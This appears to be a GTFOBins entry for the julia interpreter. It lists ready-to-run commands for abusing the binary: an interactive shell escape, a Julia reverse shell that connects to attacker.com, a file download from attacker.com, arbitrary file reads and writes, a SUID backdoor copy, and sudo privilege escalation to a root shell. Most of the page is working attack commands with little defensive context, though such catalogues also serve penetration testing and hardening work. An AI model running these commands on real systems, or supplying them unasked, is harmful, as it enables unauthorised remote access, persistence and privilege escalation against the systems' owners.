# GTFOBin: julia

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
julia -e 'run(`/bin/sh`)'
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
julia -e 'using Sockets; sock=connect(ENV["RHOST"], parse(Int64,ENV["RPORT"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
```

## File download

It can download remote files.

```
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
julia -e 'download(ENV["URL"], ENV["LFILE"])'
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
export LFILE=file_to_write
julia -e 'open(f->write(f, "DATA"), ENV["LFILE"], "w")'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
export LFILE=file_to_read
julia -e 'print(open(f->read(f, String), ENV["LFILE"]))'
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which julia) .

./julia -e 'run(`/bin/sh -p`)'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo julia -e 'run(`/bin/sh`)'
```